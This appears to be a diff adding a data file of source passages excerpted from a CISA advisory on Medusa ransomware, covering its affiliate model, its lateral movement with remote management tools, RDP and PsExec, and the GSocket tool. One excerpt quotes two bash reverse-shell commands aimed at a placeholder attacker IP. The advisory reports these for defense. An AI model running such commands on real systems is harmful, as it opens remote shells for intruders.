@@ -1,0 +1,25 @@
+SOURCE PASSAGES
+[E1; CISA]
+
+Note: This advisory uses the MITRE ATT&CK® Matrix for Enterprise framework, version 19. See the MITRE ATT&CK Tactics and Techniques section of this advisory for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques.
+Background
+(Updated Aug. 18, 2026) Since 2021, Medusa actors have used the Medusa variant to conduct ransomware attacks through at least April 2026. Medusa originally operated as a closed ransomware operation, meaning the same group of cyber threat actors controlled all development and associated ransomware campaigns. Since at least early 2023, Medusa progressed to using an affiliate model, selling RaaS to affiliates who are granted varying levels of trust based upon experience and profitability. For newer or less experienced affiliates, important operations such as ransom negotiation may be centrally controlled by the developers. Medusa actors use a double-extortion model where they encr
+[E2; CISA]
+#StopRansomware: Medusa Ransomware
+[E3; CISA]
+Technical Details
+[E4; CISA]
+-able, BeyondTrust, SimpleHelp, and Splashtop. Medusa actors use these tools—in combination with Remote Desktop Protocol (RDP) [T1021.001] and PsExec [T1569.002]—to move laterally [TA0008] through the network and identify files for exfiltration [TA0010] and encryption [T1486]. When provided with valid username and password credentials, Medusa actors use PsExec to:
+
+[E5; CISA]
+commands to create a reverse Transmission Control Protocol (TCP) connection to threat actor infrastructure:
+bash -i >& /dev/tcp/<attacker IP>/4444 0>&1
+bash -i >& /dev/tcp/<attacker IP>/443 0>&1
+GSocket
+Also known as Global Socket or gs-netcat.
+Allows workstations on different private networks to connect and bypass firewalls.
+Allows file transfers and command execution.
+Lateral Movement, Credential Access, and Execution
+(Updated Aug. 18, 2026) Medusa actors use a variety of legitimate remote monitoring and management (RMM) software [T1219]. To evade detection, they may tailor their choice based on remote access tools already present in the victim environment. 2,3 FBI identified Medusa actors using remote access software AnyDesk, Atera, ConnectWise, eHorus, N-able, BeyondTrust, SimpleHelp, and Splashtop. Medusa actors use these tools—in combination with Remote Desktop Protocol (RDP) [T1021.001] and Ps
+GRAPH NODES
+GRAPH PATHS
